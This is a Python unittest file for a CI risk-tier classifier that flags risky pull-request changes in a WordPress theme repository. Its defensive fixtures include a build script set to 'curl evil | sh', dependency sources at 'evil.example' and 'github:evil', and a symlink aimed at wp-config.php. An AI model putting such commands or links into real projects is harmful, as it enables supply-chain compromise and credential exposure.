#!/usr/bin/env python3
"""Unit tests for risk_tier.py (stdlib unittest, no deps).

Run from the repo root: python3 -m unittest discover -s .github/scripts -p 'test_*.py'
"""
import contextlib
import importlib.util
import io
import json
import os
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

_HERE = Path(__file__).resolve().parent
_SCRIPT = _HERE / "risk_tier.py"
_spec = importlib.util.spec_from_file_location("risk_tier", _SCRIPT)
rt = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(rt)

_PATTERNS_FILE = _HERE.parent / "risk-tiers.txt"
_LOW_FILE = _HERE.parent / "low-risk.txt"
REPO_PATTERNS = rt.load_patterns(_PATTERNS_FILE.read_text())
REPO_LOW_PATTERNS = rt.load_patterns(_LOW_FILE.read_text())


def _composer(*names, dev=()):
    return json.dumps({
        "packages": [{"name": n, "version": "1.0.0"} for n in names],
        "packages-dev": [{"name": n, "version": "1.0.0"} for n in dev],
    })


def _npm(*entries):
    """Build a minimal lockfileVersion 3 package-lock. Entries are keys or (key, meta)."""
    packages = {"": {"name": "lwtv-underscores"}}
    for entry in entries:
        key, meta = entry if isinstance(entry, tuple) else (entry, {})
        packages[key] = {"version": "1.0.0", **meta}
    return json.dumps({"lockfileVersion": 3, "packages": packages})


class TestLoadPatterns(unittest.TestCase):
    def test_skips_blank_lines_and_comments(self):
        self.assertEqual(rt.load_patterns("# c\n\ncron/*\n  \n.github/*\n"),
                         ["cron/*", ".github/*"])


class TestRepoPatterns(unittest.TestCase):
    def test_each_high_risk_group_matches(self):
        files = [
            ".github/workflows/production.yaml",
            ".github/workflows/ci.yml",
            ".github/scripts/risk_tier.py",
            ".github/scripts/test_risk_tier.py",
            ".github/risk-tiers.txt",
            ".github/low-risk.txt",
            ".github/dependabot.yml",
            ".githooks/pre-commit",
            "_build_scripts/postbuild.js",
            "_build_scripts/copy-composer-assets.sh",
            "cron/daily.sh",
            "cron/README.md",
            "docs/operations/fix.sh",
            "plugins/lwtv-plugin/acf-json/group_lwtv_shows_details.json",
            ".npmrc",
            ".nvmrc",
            "functions.php",
            "plugins/lwtv-plugin/functions.php",
            "plugins/lwtv-plugin/php/class-plugin.php",
            "plugins/shadow-taxonomy/index.php",
            "plugins/lwtv-plugin/php/rest-api/class-stats.php",
            "plugins/lwtv-plugin/php/wp-cli/class-cli.php",
            "plugins/lwtv-plugin/php/schedulers/class-cron.php",
            "plugins/lwtv-plugin/php/admin-menu/class-menu.php",
            "plugins/lwtv-plugin/php/postiz/class-new-post.php",
            "phpcs.xml.dist",
            "phpunit.xml.dist",
            "phpstan.neon.dist",
            "phpstan-baseline.neon",
            "eslint.config.js",
            ".stylelintrc.json",
            ".stylelintignore",
            "tests/bootstrap.php",
            ".claude/CLAUDE.md",
            ".claude/settings.json",
            ".gemini/settings.json",
            ".superpowers/sdd/x.md",
            "CLAUDE.md",
            "docs/claude.md",
            "docs/Claude.local.MD",
            "plugins/lwtv-plugin/AGENTS.md",
            "GEMINI.md",
            ".env",
            "plugins/lwtv-plugin/.env.local",
            "wp-config.php",
            "images/.htaccess",
            ".gitignore",
            "plugins/lwtv-plugin/.gitignore",
            ".gitattributes",
            ".gitmodules",
            "images/lwtv-toaster.svg",
            "plugins/lwtv-plugin/assets/images/x.svg",
        ]
        self.assertEqual(rt.match_files(files, REPO_PATTERNS), sorted(files))

    def test_everyday_paths_are_low(self):
        files = [
            "docs/plans/2026-09-01-way-to-watch.md",
            "README.md",
            "CHANGELOG.md",
            "plugins/lwtv-plugin/php/readme.md",
            "scss/partials/_cards.scss",
            "style.css",
            "style.min.css",
            "inc/css/style-admin.scss",
            "images/mystery-show.png",
            "languages/lwtv-underscores.pot",
            "single-post_type_shows.php",
            "archive.php",
            "template-parts/content/content-shows.php",
            "page-templates/page-stats.php",
            "inc/js/lwtv-theme-scripts.js",
            "plugins/lwtv-plugin/assets/js/admin.js",
            "plugins/lwtv-plugin/php/blocks/src/grade/edit.js",
            "tests/unit/Postiz/ShowAnnouncementTest.php",
            "composer.lock",
            "package-lock.json",
            "plugins/lwtv-plugin/composer.lock",
            "composer.json",
            "package.json",
            "plugins/lwtv-plugin/composer.json",
            "plugins/lwtv-plugin/package.json",
            "plugins/lwtv-plugin/php/blocks/package.json",
        ]
        self.assertEqual(rt.match_files(files, REPO_PATTERNS), [])
        self.assertEqual(rt.match_files(files, REPO_LOW_PATTERNS), sorted(files))

    def test_plugin_php_is_high_by_default(self):
        # Not on either list, so unlisted, so high.
        for path in (
            "plugins/lwtv-plugin/php/statistics/class-statistics.php",
            "plugins/lwtv-plugin/php/cpts/shows/class-shows.php",
            "plugins/lwtv-plugin/php/blocks/class-blocks.php",
            "inc/extras.php",
            "inc/bootstrap/js/bootstrap.min.js",
        ):
            with self.subTest(path=path):
                result = rt.classify([path], REPO_PATTERNS, REPO_LOW_PATTERNS)
                self.assertEqual(result["tier"], "high", result)
                self.assertIn("not on the low-risk list", result["reason"])


class TestComposerPackages(unittest.TestCase):
    def test_reads_runtime_and_dev(self):
        self.assertEqual(rt.composer_packages(_composer("twbs/bootstrap", dev=["phpunit/phpunit"])),
                         {"twbs/bootstrap", "phpunit/phpunit"})

    def test_missing_file_is_empty(self):
        self.assertEqual(rt.composer_packages(""), set())
        self.assertEqual(rt.composer_packages(None), set())


class TestNpmPackages(unittest.TestCase):
    def test_nested_and_scoped_names(self):
        lock = _npm("node_modules/webpack", "node_modules/@wordpress/scripts",
                    "node_modules/a/node_modules/semver")
        self.assertEqual(rt.npm_packages(lock), {"webpack", "@wordpress/scripts", "semver"})

    def test_workspaces_and_links_are_ignored(self):
        lock = _npm("plugins/lwtv-plugin",
                    ("node_modules/@lwtv/blocks", {"link": True, "resolved": "plugins/x"}),
                    "node_modules/webpack")
        self.assertEqual(rt.npm_packages(lock), {"webpack"})

    def test_alias_records_real_package(self):
        lock = _npm(("node_modules/prettier", {"name": "wp-prettier"}))
        self.assertEqual(rt.npm_packages(lock), {"wp-prettier"})

    def test_lockfile_v1_fails(self):
        with self.assertRaises(ValueError):
            rt.npm_packages(json.dumps({"lockfileVersion": 1, "dependencies": {}}))


class TestNewPackages(unittest.TestCase):
    def test_new_composer_package_is_reported(self):
        locks = {"composer.lock": (_composer("twbs/bootstrap"), _composer("twbs/bootstrap", "evil/pkg"))}
        self.assertEqual(rt.new_packages(locks), ["composer.lock: evil/pkg"])

    def test_version_bump_only_is_not_new(self):
        base = _composer("twbs/bootstrap")
        head = base.replace("1.0.0", "1.0.1")
        self.assertEqual(rt.new_packages({"composer.lock": (base, head)}), [])

    def test_new_transitive_npm_package_is_reported(self):
        locks = {"package-lock.json": (_npm("node_modules/webpack"),
                                       _npm("node_modules/webpack", "node_modules/webpack/node_modules/left-pad"))}
        self.assertEqual(rt.new_packages(locks), ["package-lock.json: left-pad"])

    def test_retargeted_alias_is_new(self):
        locks = {"package-lock.json": (_npm(("node_modules/prettier", {"name": "wp-prettier"})),
                                       _npm(("node_modules/prettier", {"name": "totally-prettier"})))}
        self.assertEqual(rt.new_packages(locks), ["package-lock.json: totally-prettier"])

    def test_removed_package_is_not_new(self):
        locks = {"package-lock.json": (_npm("node_modules/a", "node_modules/b"), _npm("node_modules/a"))}
        self.assertEqual(rt.new_packages(locks), [])

    def test_new_lockfile_reports_everything(self):
        locks = {"plugins/lwtv-plugin/composer.lock": ("", _composer("johngrogg/ics-parser"))}
        self.assertEqual(rt.new_packages(locks),
                         ["plugins/lwtv-plugin/composer.lock: johngrogg/ics-parser"])


def _pkg(deps=None, dev=None, **extra):
    doc = {"name": "lwtv", "version": "7.2.8", "scripts": {"build": "wp-scripts build"}}
    if deps is not None:
        doc["dependencies"] = deps
    if dev is not None:
        doc["devDependencies"] = dev
    doc.update(extra)
    return json.dumps(doc)


class TestManifestIsVersionBump(unittest.TestCase):
    def test_range_bump_is_a_bump(self):
        self.assertTrue(rt.manifest_is_version_bump(
            _pkg({"@wordpress/icons": "^15.3.0"}), _pkg({"@wordpress/icons": "^15.4.0"})))

    def test_composer_bump_is_a_bump(self):
        base = json.dumps({"require": {"php": ">=8.5"}, "require-dev": {"phpunit/phpunit": "^13"}})
        head = json.dumps({"require": {"php": ">=8.5"}, "require-dev": {"phpunit/phpunit": "^13.3"}})
        self.assertTrue(rt.manifest_is_version_bump(base, head))

    def test_project_version_change_is_allowed(self):
        self.assertTrue(rt.manifest_is_version_bump(_pkg({"a": "1"}), _pkg({"a": "1"}, version="7.2.9")))

    def test_not_a_bump(self):
        base = _pkg({"a": "^1.0.0"})
        cases = {
            "new dependency": _pkg({"a": "^1.0.0", "b": "^1"}),
            "removed dependency": _pkg({}),
            "dependency moved to dev": _pkg({}, {"a": "^1.0.0"}),
            "script changed": _pkg({"a": "^1.0.0"}, scripts={"build": "curl evil | sh"}),
            "preinstall added": _pkg({"a": "^1.0.0"}, scripts={"build": "wp-scripts build", "preinstall": "x"}),
            "override added": _pkg({"a": "^1.0.0"}, overrides={"a": "npm:b@1"}),
            "git source": _pkg({"a": "github:evil/a"}),
            "tarball source": _pkg({"a": "https://evil.example/a.tgz"}),
            "alias": _pkg({"a": "npm:b@^1"}),
            "file source": _pkg({"a": "file:../a"}),
            "non-string": _pkg({"a": {"version": "1"}}),
            "deleted": "",
            "not json": "{",
        }
        for label, head in cases.items():
            with self.subTest(label):
                self.assertFalse(rt.manifest_is_version_bump(base, head))
        self.assertFalse(rt.manifest_is_version_bump("", base), "new manifest")

    def test_source_to_version_is_not_a_bump(self):
        # Swapping a git source or inline definition for a registry version changes
        # where the code comes from, even though the new value looks like a version.
        head = _pkg({"a": "^1.0.0"})
        for label, old in {
            "from git": _pkg({"a": "github:someone/a"}),
            "from tarball": _pkg({"a": "https://example.com/a.tgz"}),
            "from alias": _pkg({"a": "npm:b@^1"}),
            "from inline object": _pkg({"a": {"version": "1.0.0", "source": "x"}}),
        }.items():
            with self.subTest(label):
                self.assertFalse(rt.manifest_is_version_bump(old, head))

    def test_composer_repositories_change_is_not_a_bump(self):
        base = json.dumps({"require": {"a/a": "^1"}})
        head = json.dumps({"require": {"a/a": "^1"}, "repositories": [{"type": "vcs", "url": "x"}]})
        self.assertFalse(rt.manifest_is_version_bump(base, head))


class TestClassify(unittest.TestCase):
    def _classify(self, files, locks=None):
        return rt.classify(files, REPO_PATTERNS, REPO_LOW_PATTERNS, locks=locks)

    def test_low_when_every_file_is_on_the_allowlist(self):
        result = self._classify(["scss/partials/_cards.scss", "style.css", "docs/x.md"])
        self.assertEqual(result["tier"], "low", result)
        self.assertEqual(result["reason"], "no high-risk changes")

    def test_high_on_a_listed_path(self):
        result = self._classify(["cron/daily.sh", "README.md"])
        self.assertEqual(result["tier"], "high")
        self.assertEqual(result["files"], ["cron/daily.sh"])

    def test_listed_file_inside_an_allowed_area_is_still_high(self):
        # docs/* is allowlisted, but agent instructions and shell scripts are not.
        for path in ("docs/CLAUDE.md", "docs/operations/restore.sh", "images/new.svg"):
            with self.subTest(path=path):
                self.assertEqual(self._classify([path])["tier"], "high")

    def test_anything_not_allowlisted_is_high(self):
        for path in ("brand-new-dir/thing.txt", "mu-plugins/x.php", "notes.txt", "webpack.config.js"):
            with self.subTest(path=path):
                result = self._classify([path])
                self.assertEqual(result["tier"], "high")
                self.assertEqual(result["files"], [path])

    def test_dependabot_bump_is_low(self):
        base = _npm("node_modules/webpack")
        head = base.replace("1.0.0", "5.1.0")
        result = self._classify(["package-lock.json"], {"package-lock.json": (base, head)})
        self.assertEqual(result["tier"], "low", result)

    def test_new_package_is_high(self):
        locks = {"composer.lock": (_composer("a/a"), _composer("a/a", "b/b"))}
        result = self._classify(["composer.lock"], locks)
        self.assertEqual(result["tier"], "high")
        self.assertEqual(result["packages"], ["composer.lock: b/b"])
        self.assertIn("new package", result["reason"])

    def test_dependabot_manifest_bump_is_low(self):
        manifests = {"plugins/lwtv-plugin/php/blocks/package.json":
                     (_pkg({"@wordpress/icons": "^15.3.0"}), _pkg({"@wordpress/icons": "^15.4.0"}))}
        result = rt.classify(list(manifests), REPO_PATTERNS, REPO_LOW_PATTERNS, manifests=manifests)
        self.assertEqual(result["tier"], "low", result)

    def test_manifest_script_change_is_high(self):
        manifests = {"package.json": (_pkg(), _pkg(scripts={"build": "x"}))}
        result = rt.classify(["package.json"], REPO_PATTERNS, REPO_LOW_PATTERNS, manifests=manifests)
        self.assertEqual(result["tier"], "high")
        self.assertEqual(result["files"], ["package.json"])
        self.assertIn("beyond version bumps", result["reason"])

    def test_manifest_without_contents_fails_closed(self):
        result = rt.classify(["composer.json"], REPO_PATTERNS, REPO_LOW_PATTERNS)
        self.assertEqual(result["tier"], "high")

    def test_empty_patterns_raise(self):
        with self.assertRaises(ValueError):
            rt.classify(["README.md"], [], REPO_LOW_PATTERNS)
        with self.assertRaises(ValueError):
            rt.classify(["README.md"], REPO_PATTERNS, [])


class TestSpecialFiles(unittest.TestCase):
    RAW = "\n".join([
        ":000000 120000 0000000 3594e94 A\timages/logo.png",
        ":000000 160000 0000000 a1b2c3d A\tplugins/sub",
        ":100644 100644 1111111 2222222 M\tscss/a.scss",
        ":120000 000000 3594e94 0000000 D\told/link",
    ])

    def test_added_symlinks_and_submodules_are_special(self):
        self.assertEqual(rt.special_files(self.RAW), ["images/logo.png", "plugins/sub"])

    def test_a_symlink_on_an_allowlisted_path_is_high(self):
        result = rt.classify(["images/logo.png"], REPO_PATTERNS, REPO_LOW_PATTERNS,
                             special=["images/logo.png"])
        self.assertEqual(result["tier"], "high")
        self.assertIn("symlink or submodule", result["reason"])


class TestMainFailsClosed(unittest.TestCase):
    def test_git_failure_yields_high(self):
        err = subprocess.CalledProcessError(128, ["git"], stderr="bad revision")
        out = io.StringIO()
        with mock.patch.object(rt, "_git", side_effect=err), contextlib.redirect_stdout(out):
            code = rt.main(["--base", "aaa", "--head", "bbb"])
        self.assertEqual(code, 0)
        result = json.loads(out.getvalue())
        self.assertEqual(result["tier"], "high")
        self.assertIn("treating as high risk", result["reason"])

    def test_bad_lockfile_yields_high(self):
        out = io.StringIO()
        with mock.patch.object(rt, "_git", return_value="package-lock.json\n"), \
                mock.patch.object(rt, "_file_at", return_value="not json"), \
                contextlib.redirect_stdout(out):
            rt.main(["--base", "aaa", "--head", "bbb",
                     "--patterns", str(_PATTERNS_FILE), "--low-patterns", str(_LOW_FILE)])
        self.assertEqual(json.loads(out.getvalue())["tier"], "high")


class TestMainRealGit(unittest.TestCase):
    """Runs main() against a throwaway git repo, so git's own diff behaviour is tested."""

    def _git(self, *args, cwd):
        return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True,
                              text=True).stdout.strip()

    def _repo(self, tmp):
        repo = Path(tmp)
        self._git("init", "-q", cwd=repo)
        self._git("config", "user.email", "t@example.com", cwd=repo)
        self._git("config", "user.name", "t", cwd=repo)
        return repo

    def _main(self, repo, base):
        out = io.StringIO()
        old_cwd = os.getcwd()
        os.chdir(repo)
        try:
            with contextlib.redirect_stdout(out):
                rt.main(["--base", base, "--head", "HEAD", "--patterns", str(_PATTERNS_FILE),
                         "--low-patterns", str(_LOW_FILE)])
        finally:
            os.chdir(old_cwd)
        return json.loads(out.getvalue())

    def test_renamed_high_risk_file_is_still_high(self):
        # Moving a cron script into docs/ must still be judged by its old path.
        with tempfile.TemporaryDirectory() as tmp:
            repo = self._repo(tmp)
            (repo / "cron").mkdir()
            (repo / "docs").mkdir()
            body = "".join(f"echo {i}\n" for i in range(40))
            (repo / "cron" / "daily.txt").write_text(body)
            self._git("add", "-A", cwd=repo)
            self._git("commit", "-qm", "base", cwd=repo)
            base = self._git("rev-parse", "HEAD", cwd=repo)
            self._git("mv", "cron/daily.txt", "docs/daily.txt", cwd=repo)
            self._git("commit", "-qm", "move", cwd=repo)
            result = self._main(repo, base)
        self.assertEqual(result["tier"], "high", result)
        self.assertIn("cron/daily.txt", result["files"])

    def test_symlink_under_images_is_high(self):
        # rsync -l deploys symlinks as symlinks; this one would serve wp-config.php.
        with tempfile.TemporaryDirectory() as tmp:
            repo = self._repo(tmp)
            (repo / "images").mkdir()
            (repo / "images" / "a.png").write_bytes(b"png")
            self._git("add", "-A", cwd=repo)
            self._git("commit", "-qm", "base", cwd=repo)
            base = self._git("rev-parse", "HEAD", cwd=repo)
            (repo / "images" / "b.png").symlink_to("../../../../wp-config.php")
            self._git("add", "-A", cwd=repo)
            self._git("commit", "-qm", "link", cwd=repo)
            result = self._main(repo, base)
        self.assertEqual(result["tier"], "high", result)
        self.assertEqual(result["files"], ["images/b.png"])

    def test_package_added_on_base_branch_is_not_blamed_on_pr(self):
        # Lockfiles are compared at the merge base, matching the three-dot file diff.
        with tempfile.TemporaryDirectory() as tmp:
            repo = self._repo(tmp)
            (repo / "composer.lock").write_text(_composer("a/a"))
            self._git("add", "-A", cwd=repo)
            self._git("commit", "-qm", "base", cwd=repo)
            self._git("branch", "-M", "main", cwd=repo)
            self._git("checkout", "-qb", "feature", cwd=repo)
            (repo / "composer.lock").write_text(_composer("a/a").replace("1.0.0", "1.0.1"))
            self._git("commit", "-qam", "bump", cwd=repo)
            self._git("checkout", "-q", "main", cwd=repo)
            (repo / "composer.lock").write_text(_composer("a/a", "b/b"))
            self._git("commit", "-qam", "add b on main", cwd=repo)
            main_sha = self._git("rev-parse", "HEAD", cwd=repo)
            self._git("checkout", "-q", "feature", cwd=repo)
            result = self._main(repo, main_sha)
        self.assertEqual(result["tier"], "low", result)
        self.assertEqual(result["packages"], [])


if __name__ == "__main__":
    unittest.main()
